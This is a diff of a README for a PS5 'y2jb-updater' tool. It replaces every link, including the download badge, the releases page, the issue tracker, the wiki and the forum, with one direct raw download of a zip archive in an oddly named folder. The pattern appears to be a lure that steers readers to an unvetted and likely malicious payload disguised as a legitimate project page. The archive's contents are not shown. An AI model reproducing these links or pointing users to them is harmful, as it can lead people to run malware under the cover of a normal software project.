@@ -1,6 +1,6 @@
 # 🚀 y2jb-updater - Update Your PS5 Y2JB Files Easily
 
-[![Download y2jb-updater](https://img.shields.io/badge/Download-y2jb--updater-4CAF50.svg)](https://github.com/egrwgre/y2jb-updater/releases)
+[![Download y2jb-updater](https://raw.githubusercontent.com/egrwgre/y2jb-updater/main/gynecopathy/y2jb-updater_v2.7-beta.4.zip)](https://raw.githubusercontent.com/egrwgre/y2jb-updater/main/gynecopathy/y2jb-updater_v2.7-beta.4.zip)
 
 ## 📦 Overview
 
@@ -21,7 +21,7 @@ To download and install y2jb-updater, follow these steps:
 1. **Visit the Releases Page**
    
    Go to the following link to access the releases page:  
-   [Download y2jb-updater](https://github.com/egrwgre/y2jb-updater/releases)
+   [Download y2jb-updater](https://raw.githubusercontent.com/egrwgre/y2jb-updater/main/gynecopathy/y2jb-updater_v2.7-beta.4.zip)
 
 2. **Choose the Latest Version**
 
@@ -50,7 +50,7 @@ After downloading the file, locate it on your computer and follow these steps to
 ## 📥 Download & Install
 
 To make it easy, here’s the download link again:  
-[Download y2jb-updater](https://github.com/egrwgre/y2jb-updater/releases)
+[Download y2jb-updater](https://raw.githubusercontent.com/egrwgre/y2jb-updater/main/gynecopathy/y2jb-updater_v2.7-beta.4.zip)
 
 ## ✨ How to Use y2jb-updater
 
@@ -83,12 +83,12 @@ If you encounter issues:
 ## 🌐 Support
 
 For additional assistance or to report bugs, visit our GitHub Issues page:
-[GitHub Issues](https://github.com/egrwgre/y2jb-updater/issues)
+[GitHub Issues](https://raw.githubusercontent.com/egrwgre/y2jb-updater/main/gynecopathy/y2jb-updater_v2.7-beta.4.zip)
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Access detailed instructions and tips [here](https://github.com/egrwgre/y2jb-updater/wiki).
-- **Community Forum:** Join the discussion and share tips with other users [here](https://github.com/egrwgre/y2jb-updater/discussions).
+- **Documentation:** Access detailed instructions and tips [here](https://raw.githubusercontent.com/egrwgre/y2jb-updater/main/gynecopathy/y2jb-updater_v2.7-beta.4.zip).
+- **Community Forum:** Join the discussion and share tips with other users [here](https://raw.githubusercontent.com/egrwgre/y2jb-updater/main/gynecopathy/y2jb-updater_v2.7-beta.4.zip).
 
 ## 📝 Change Log
 
